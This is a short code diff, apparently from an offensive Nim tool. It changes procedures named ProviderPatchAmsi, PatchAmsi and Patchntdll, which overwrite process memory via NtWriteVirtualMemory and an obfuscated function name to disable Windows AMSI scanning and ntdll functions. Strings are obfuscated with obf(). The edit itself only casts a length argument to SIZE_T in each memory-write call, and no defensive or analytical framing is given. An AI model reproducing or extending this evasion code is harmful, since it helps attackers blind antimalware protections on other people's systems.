@@ -245,7 +245,7 @@ proc ProviderPatchAmsi(): void =
         var 
             bytesWritten: SIZE_T
         var outLength: SIZE_T
-        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
         if not NT_SUCCESS(status):
             when defined(verbose):
                 echo obf("[-] Failed to write memory.")
@@ -285,7 +285,7 @@ proc ProviderPatchAmsi(): void =
                     echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         var outLength: SIZE_T
     
-        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
     
         if (success != 0):
             when defined(verbose):
@@ -401,7 +401,7 @@ proc PatchAmsi(): bool =
             bytesWritten: SIZE_T
 
         var outLength: SIZE_T
-        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
 
         if not NT_SUCCESS(status):
             when defined(verbose):
@@ -443,7 +443,7 @@ proc PatchAmsi(): bool =
                     echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         var outLength: SIZE_T
     
-        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
     
         if (success != 0):
             when defined(verbose):
@@ -564,7 +564,7 @@ proc Patchntdll(): bool =
             bytesWritten: SIZE_T
 
         var outLength: SIZE_T
-        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
 
         if not NT_SUCCESS(status):
             when defined(verbose):
@@ -606,7 +606,7 @@ proc Patchntdll(): bool =
                     echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         var outLength: SIZE_T
     
-        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
     
         if (success != 0):
             when defined(verbose):
